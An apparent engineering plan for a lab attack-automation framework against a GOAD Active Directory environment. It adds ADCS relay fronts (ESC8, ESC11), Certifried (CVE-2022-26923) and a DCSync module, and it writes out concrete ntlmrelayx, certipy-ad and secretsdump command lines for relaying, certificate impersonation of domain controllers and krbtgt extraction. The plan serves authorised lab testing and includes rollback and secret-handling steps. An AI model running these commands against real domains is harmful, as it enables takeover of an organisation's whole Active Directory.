# PLAN-N1 (25NOV2026) — ADCS/CVE relay fronts + the reusable DCSync terminal

**Status:** DRAFT → 1 independent review (Opus) → execute → verify → C.
**Objective:** add the highest-value **front** techniques toward Domain Admin (the ESC8 coerce→DA keystone, ESC11, Certifried) **and** the reusable **DCSync terminal module** `b1`, so the chaining engine (C) can immediately compose `front + terminal` (ADR-002 D4 modularity: `a1+b1`/`a2+b1`). Acceptance: each technique emits a `proof.v1` receipt the real `score_proof` grades `proved` on a vulnerable `{host_id}` and `not-proved` on a non-vulnerable one; the suite stays green; each new edge declares `pre`/`eff` capability-state metadata for C.

Evidence base: `docs/research/ad-attack-robustness-catalog-24NOV2026.md` (§1 ranked paths, §3.2 ADCS, §3.3 coercion+relay), ADR-001 (ProcessManager), ADR-002 (D3 predicates, D4 modularity, D5 ADCS rollback).

## Scope (4 new edges) + sprint split
- **Sprint A — ESC8** (the keystone; listener-based, ProcessManager).
- **Sprint B — ESC11** (ADCS RPC relay; shares ESC8's structure).
- **Sprint C — Certifried** (CVE-2022-26923; synchronous, like ADCS-ESC1).
- **Sprint D — DCSync terminal module** (the reusable `b1`; non-mutating).
Each sprint = new executor + precondition probe + harness facet entry + tests + real-scorer cross-check. A/B/C/D are independently shippable; D (DCSync) is the one C most needs.

## Harness truth-facet entries (I own these — the judge defines "proved")
Add to `ad-lab-harness .../truth/GOAD-proof.json` (S0 branch `dev/validation-proof-scorer`). All keep the existing 6 terminal kinds — **no schema change**. Vulnerable sets are **flagged PENDING lab confirmation** (consistent with the existing ASREP/SHADOW domain-level "pending per-entity refinement" entries); they are refined once the lab's ADCS web-enrollment / RPC-enrollment exposure and CA patch level are observed (via the run-time probes below).

```jsonc
"ESC8": {
  "class": "adcs", "terminal": "cert_issued_and_used", "mutating": true,
  "vulnerable": [{"host_id": "dc01"}, {"host_id": "srv03"}],
  "proof_requires": "coerce a privileged machine, relay its NTLM auth to the CA Web Enrollment endpoint (certsrv/certfnsh.asp) WITHOUT EPA, obtain a machine/DC certificate, use it for PKINIT",
  "anchor": "research 24NOV2026 §3.3 ESC8 keystone; GOAD CA hosts dc01/srv03 — WEB-ENROLLMENT exposure PENDING lab confirmation"
},
"ESC11": {
  "class": "adcs", "terminal": "cert_issued_and_used", "mutating": true,
  "vulnerable": [{"host_id": "dc01"}, {"host_id": "srv03"}],
  "proof_requires": "relay coerced NTLM auth to the CA RPC enrollment interface (MS-ICPR) with request encryption NOT enforced, obtain a certificate, use it for PKINIT",
  "anchor": "ADCS catalog ESC11; GOAD CA hosts — RPC-enrollment encryption enforcement PENDING lab confirmation"
},
"CERTIFRIED": {
  "class": "adcs", "terminal": "cert_issued_and_used", "mutating": true,
  "vulnerable": [{"host_id": "srv03", "domain": "essos.local"}],
  "proof_requires": "create a computer (MachineAccountQuota>0), set its dNSHostName to a DC's, request a Machine-template cert on an UNPATCHED CA (no SID security extension / pre-May-2022), use it for PKINIT as the DC",
  "anchor": "CVE-2022-26923; GOAD ESSOS-CA (srv03) — CA patch level (SID-ext present?) PENDING lab confirmation via the SID-ext oracle at run time"
},
"DCSYNC": {
  "class": "dcsync", "terminal": "replication_dump", "mutating": false,
  "vulnerable": [{"host_id": "dc01"}, {"host_id": "dc02"}, {"host_id": "dc03"}],
  "proof_requires": "with replication rights (held only by a DA-equivalent), DRSUAPI-replicate the krbtgt secret from the DC — success IS Domain Admin",
  "anchor": "DCSync is the universal, non-destructive DA proof (research §1); DCs dc01/dc02/dc03"
}
```
Review question 1: are these terminal/mutating choices + the PENDING vulnerable sets acceptable, or should any key on `{domain}` instead of `{host_id}`?

## Per-technique executor design

### ESC8 (`executors/esc8.py`) — listener-based, mutating
- terminal `cert_issued_and_used`; `mutating=True`; `verified_recipe=False` (recipe-known, not lab-proven); target_identity = `resolve_target_identity(ca_host)` → `{host_id}`.
- Flow (ProcessManager + coercion, reuse `coercion_trigger_argv`/`poll_for_capture` from T1c-2): `start` `impacket-ntlmrelayx -t http://<ca_host>/certsrv/certfnsh.asp --adcs --template DomainController -smb2support` → coerce `victim_dc` → `listener_host` → poll for the issued-PFX artifact (`predicates.file_present_nonempty` on `<out>/*.pfx`) / the "Base64 certificate"/"GOT certificate" marker → `stop`; then `certipy-ad auth -pfx <dc>.pfx` PKINIT → terminal ok when a cert was issued AND PKINIT succeeded.
- **Rollback (D5)**: a cert was issued → destroy the `.pfx`/`.ccache` key material (verified by `file_destroyed`, `removed>=1`), optional CA-DB hold deferred to N3. mutating → verified rollback required.
- params: `ca_host` (rec finding.host/entity.ca_host), `victim_dc`, `listener_host`, `template` (rec `DomainController`), `method`.
- probe (`Esc8Probe`): `certipy-ad find -stdout` → Web Enrollment / ESC8 marker present → viable; CA absent → not-viable; unreadable → unknown.

### ESC11 (`executors/esc11.py`) — like ESC8 but RPC transport
- Same shape; listener `impacket-ntlmrelayx -t rpc://<ca_host> -rpc-mode ICPR -icpr-ca-name <ca> --adcs -smb2support`. probe: `certipy find` "Enforce Encryption for Requests: Disabled" (ESC11) marker. Same rollback.

### Certifried (`executors/certifried.py`) — synchronous (no listener), mutating
- terminal `cert_issued_and_used`; `mutating=True`; target_identity = `{**resolve_target_identity(dc_host), "domain": cfg.domain}`.
- Flow: `certipy-ad account create -user <new> -dns <dc_fqdn> ...` (needs MAQ>0) → `certipy-ad req -template Machine -ca <ca> -dc-ip <dc>` → `certipy-ad auth -pfx` PKINIT as the DC → terminal ok when the DC-context cert authenticated.
- **Rollback**: delete the created computer (`certipy account delete` / `impacket-addcomputer -delete`) **verified by an LDAP/exist re-check** + destroy the pfx. mutating → verified rollback.
- probe (`CertifriedProbe`): the SID-ext oracle (research §3.2) — a baseline `User` cert LACKS "Certificate object SID" → unpatched → viable; present → patched → not-viable; + MAQ>0 read; unreadable → unknown.

### DCSync terminal module (`executors/dcsync.py`) — the reusable `b1`, non-mutating
- terminal `replication_dump`; `mutating=False`; `verified_recipe=True` (deterministic read); target_identity = `resolve_target_identity(dc_host)` → `{host_id}`.
- Flow: `impacket-secretsdump -just-dc-user krbtgt -k -no-pass <dom>/<dc>$@<dc>` (or with the supplied creds/hash) → terminal ok when the replication returned the krbtgt object. **The krbtgt hash is a SECRET** → presence-only; proof_token over public parts (DCSYNC, domain, dc, "krbtgt_replicated"). No rollback (read).
- params: `dc_host` (rec finding.host/dc_ip), `principal`/creds come from `ctx.config` (the DA-equivalent context the chaining engine supplies). This is the module C invokes once a front has produced replication-capable creds.

## Modularity hook (toward C, ADR-002 D4)
Each new edge declares `pre`/`eff` capability states (add a small `pre`/`eff` attribute or a mapping the engine reads): ESC8/ESC11 `eff = {cert_for(DC)}` → (PKINIT) `{dc_tgt}`; Certifried `eff = {dc_tgt}`; **DCSync `pre = {dc_tgt | da_creds}`, `eff = {krbtgt, S_DA}`**. So `ESC8→DCSync` and `UNCONSTRAINED-DELEG→DCSync` and `Certifried→DCSync` are all valid `a_i + b1` paths — DCSync (`b1`) written once, composed with every front. Review question 2: put `pre`/`eff` on the executor class now (N1) or introduce the capability-state enum in C? (Lean: a minimal `pre`/`eff` tuple on each edge now, so C is pure composition.)

## Findings-map vs chaining-edge (decision)
ESC8/ESC11/Certifried/DCSync are primarily **chaining-engine edges** invoked by precondition, not aranum findings. Light `findings.py` additions only where a detector surfaces them (certipy-find ESC8/ESC11 markers → map to the technique); DCSync is never a "finding" — it is the terminal module C invokes. Review question 3: confirm we do NOT force these through the aranum finding-map (they're edges), to avoid false "no finding → skip".

## Test plan (Phase 7)
Per technique: fake-runner (+ fake ProcessManager for ESC8/ESC11) end-to-end proved-shape; no-capture/timeout → inconclusive; gate-denied; no-secret-leak (pfx/ccache/krbtgt hash absent); mutating ones → verified rollback + an unverified-rollback → inconclusive (positive-confirmation, per the review lesson); probe viable/not-viable/unknown. **Real-scorer cross-check** per technique (proved on vulnerable host_id; not-proved on a non-vulnerable one) — and the DCSync `proved` demonstrates the reusable terminal. Keep the 138 current tests green.

## Rollback / safety
All mutating (ESC8/ESC11/Certifried) carry a verified rollback (destroy key material; Certifried also deletes the created computer with an exist re-check). DCSync is read-only. Destructive n-days (Zerologon etc.) are NOT in N1. verified_recipe=False on ESC8/ESC11/Certifried (opt-in, honest); DCSync verified_recipe=True.

## Benefit (Phase 8)
After N1: 15 techniques (11 + ESC8/ESC11/Certifried/DCSync), the ESC8 keystone + the reusable DCSync terminal — the minimum for C to demonstrate `coerce→ESC8→DCSync = DA in minutes` as a composed (not scripted) path.

## Open questions for the review
1. Facet terminal/mutating/key choices + PENDING vulnerable sets (above).
2. `pre`/`eff` on edges now (N1) vs in C.
3. Treat ESC8/ESC11/Certifried/DCSync as chaining edges (not forced through the finding-map).
4. ESC8/ESC11 terminal `cert_issued_and_used` vs modeling the DA as the subsequent DCSync (`replication_dump`) — i.e. is the DC *cert+PKINIT* a sufficient standalone proof, or must the front chain into DCSync to score DA? (Lean: cert_issued_and_used is the front's own proof; DA is the composed front+DCSync — keeps modules small.)
